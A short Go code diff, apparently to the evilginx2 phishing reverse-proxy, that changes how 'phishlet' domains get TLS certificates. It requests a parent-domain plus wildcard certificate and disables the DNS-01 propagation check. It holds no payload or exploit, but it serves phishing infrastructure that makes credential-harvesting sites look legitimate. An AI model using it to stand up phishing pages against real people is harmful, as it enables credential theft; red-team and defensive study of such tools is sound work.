@@ -318,7 +318,11 @@ func (d *CertDb) obtainPhishletCertificate(site_name string, base_domain string,
 	}
 	crt_dir := filepath.Join(d.dataDir, base_domain)
 
-	cert_res, err := d.registerCertificate(domains)
+	// Make sure we get a certificate for the base domain
+	domain_prefix := base_domain[strings.Index(base_domain, ".")+1:]
+	log.Info("Hostname: %v, Hostname prefix: %v", base_domain, domain_prefix)
+
+	cert_res, err := d.registerCertificate([]string{domain_prefix, "*." + domain_prefix})
 	if err != nil {
 		return err
 	}
@@ -363,7 +367,9 @@ func (d *CertDb) registerCertificate(domains []string) (*certificate.Resource, e
 	    return nil, err
 	}
 
-	d.client.Challenge.SetDNS01Provider(evilginx2DNS)
+	d.client.Challenge.SetDNS01Provider(evilginx2DNS,
+		dns01.DisableCompletePropagationRequirement(),
+	)
 	d.client.Challenge.Remove(challenge.TLSALPN01)
 	d.client.Challenge.Remove(challenge.HTTP01)
 
